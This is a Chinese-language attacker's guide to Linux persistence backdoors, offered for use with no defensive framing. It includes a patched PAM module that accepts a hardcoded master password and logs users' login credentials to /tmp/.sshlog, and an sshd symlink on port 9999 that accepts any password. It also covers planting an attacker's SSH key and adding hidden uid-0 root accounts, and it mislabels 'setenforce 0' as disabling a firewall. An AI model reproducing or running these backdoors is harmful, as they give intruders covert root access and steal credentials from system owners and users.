
## **PAM后门**
在Linux系统中，PAM（Pluggable Authentication Modules）是一个动态链接库，提供了一种灵活的机制来实施各种认证相关的策略。

流程：
获取目标系统所使用的PAM版本，下载对应版本的pam版本
<https://github.com/linux-pam/linux-pam/releases/tag/Linux-PAM-1_1_8>
解压缩，修改pam_unix_auth.c文件，添加万能密码
编译安装PAM
编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换
即使用万能密码登陆，会将用户名密码记录到文件中，root用户就只能用ssh万能密码登录。

```
setenforce 0     ##关闭防火墙
rpm -qa | grep pam ##查看pam版本

安装gcc和编译需要的flex库
yum install gcc flex flex-devel -y

vim linux-pam-Linux-PAM-1_1_8/modules/pam_unix/pam_unix_auth.c

/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
if(strcmp("hackers",p)==0){return PAM_SUCCESS;} //后门密码
if(retval == PAM_SUCCESS){ 
FILE * fp; 
fp = fopen("/tmp/.sshlog", "a");//SSH登录用户密码保存位置
fprintf(fp, "%s : %s\n", name, p); 
fclose(fp);} 
name = p = NULL;
AUTH_RETURN;

此时/tmp/.sshlog中万能密码：root : admin@123

编译
cd linux-pam-Linux-PAM-1_1_8
./configure && make
```

^
## **OpenSSH后门**
替换本身操作系统的ssh协议支撑软件openssh，重新安装自定义的openssh,达到记录帐号密码，也可以采用万能密码连接的功能！




## **SSH软链接**
在sshd服务配置开启PAM认证的前提下，
PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录，即使密码错误。


查看是否开启pam身份验证
```
cat /etc/ssh/sshd_config|grep UsePAM
这里如果是no可以去这个配置文件中直接去修改，不过需要是root权限。
```
端口建立软链接，并开放防火墙
```
ln -sf /usr/sbin/sshd /tmp/su ;/tmp/su -oPort=9999
#开启软链接，链接端口为9999
 
firewall-cmd --add-port=9999/tcp --permanent
#开启防火墙规则，不然会连接不上
 
firewall-cmd --reload
#重启防火墙服务
 
firewall-cmd --query-port=9999/tcp
#查看防火墙9999端口是否被放行，回显为YES即成功放行
```
连接，随便输入密码登录成功
````
ssh root@192.168.10.60 -p 9999   
````






## **加公私钥认证**
本地利用密钥生成器制作一对RSA密钥即公钥和私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。
缺点：太容易被发现。

开启密钥认证，攻击机和目标机都需要设置
```
vim /etc/ssh/sshd_config

RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```
本地生成
```
ssh-keygen -t rsa #三次回车
id_rsa : 私钥
id_rsa.pub : 公钥
```
上传连接
```
/root/.ssh/authorized_keys

ssh root@192.168.10.60
```






## **加后门账户**
创建后门账户
缺点：容易被发现

方式1：
添加账号test1，设置uid为0，密码为123456
```
useradd -p `openssl passwd -1 -salt 'salt' 123456` test1 -o -u 0 -g root -G root -s /bin/bash -d /home/test1
```

方式2：
```
echo "test2:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
passwd test2 #修改test2的密码为123456
```